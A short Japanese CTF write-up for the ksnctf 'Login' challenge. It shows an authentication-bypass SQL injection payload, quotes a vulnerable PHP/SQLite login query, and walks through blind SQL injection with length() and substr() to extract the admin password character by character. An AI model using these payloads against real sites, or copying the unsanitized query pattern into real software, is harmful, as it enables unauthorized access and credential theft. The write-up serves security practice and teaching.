## [6. Login](http://ksnctf.sweetduet.info/problem/6)

アクセスするとログインフォームがあり、"admin" ユーザでログインせよと書いてある。
とりあえずユーザ名を "admin", パスワードを `' OR 0 = 0 --` とすればログインはできるが、これでflagが得られるわけではなく、以下のように表示される。

```
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:

<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}

    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';

    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
...
```

adminユーザのパスワードがflagになっているようだ。
しかし、このソースを見ると、SQLiによってパスワードを直接得ることは難しい。

今回のような場合、SQLの `length()` や `substr()` 関数を使ってパスワードを絞り込んでいく方法がある。
まず、SQLクエリが

```sql
SELECT * FROM user WHERE id='admin' AND (SELECT length(pass) FROM user WHERE id='admin') < 30; -- ' AND pass=''''
```

などになるように `id` を指定すると、パスワードの長さが30より小さいかが分かる。
これによってパスワードの長さを絞りこめる。

次に、

```sql
SELECT * FROM user WHERE id='admin' AND substr((SELECT pass FROM user WHERE id='admin'), 1, 1) = 'a'; -- ' AND pass=''''
```

となるようにすると、パスワードの1文字目が 'a' であるかが分かる。
他の位置、文字に対しても同様にして、パスワード全体を取得できる。

* [Rust版](https://github.com/ordovicia/ksnctf/blob/master/6-Login/solve.rs)
* [Python版](https://github.com/ordovicia/ksnctf/blob/master/6-Login/solve.py)
